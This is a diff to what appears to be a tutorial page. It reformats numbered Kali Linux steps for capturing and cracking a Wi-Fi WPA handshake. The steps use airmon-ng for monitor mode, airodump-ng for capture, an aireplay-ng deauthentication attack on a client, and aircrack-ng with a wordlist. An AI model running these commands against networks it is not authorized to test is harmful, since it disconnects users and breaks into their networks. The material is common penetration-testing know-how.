@@ -25,14 +25,19 @@ aircrack-ng<br>
 <br>
 Kali Linux Commands:<br>
 <br>
-1. ifconfig to check network interfaces<br>
-2. iwconfig to check wireless interfaces<br>
- By default the wireless interface is in MANAGED MODE. <br>
-3. airmon-ng stop wlan0 (STOP - if the interface is wlan0)<br>
-4. airmon-ng start wlan0 (START - It will be gone into monitoring mode)<br>
-5. airodump-ng wlan0 or wlan0mon<br>
-6. airodump-ng --bssid <b>BSSID</b> --channel <b>CHANNEL</b> -w <b>ESSID</b> wlan0 (or if its wlan0mon)<br>
+1. To check network interfaces
+  <pre>ifconfig</pre>
+2. To check wireless interfaces
+  <pre>iwconfig </pre>
+   By default the wireless interface is in MANAGED MODE. <br>
+
+3. STOP - if the interface is wlan0
+  <pre>airmon-ng stop wlan0</pre>
+4. START - It will be gone into monitoring mode
+   <pre>airmon-ng start wlan0</pre>
+5. <pre>airodump-ng wlan0 </pre> or wlan0mon
+6. <pre>airodump-ng --bssid <b>BSSID</b> --channel <b>CHANNEL</b> -w <b>ESSID</b> wlan0</pre> (or if its wlan0mon)
 7. Open another terminal or terminal tab and then enter the following command<br>
-8. aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon<br>
+8. <pre>aireplay-ng --deauth 10 -a <b>BSSID</b> -c <b>CLIENT_MAC</b> wlan0mon</pre>
    Or wait for someone to join the network. <br>
-9. aircrack-ng -w /path/to/wordlist.txt -b <BSSID> capture-01.cap<br>
+9. <pre>aircrack-ng -w /path/to/wordlist.txt -b <b>BSSID</b> capture-01.cap</pre>
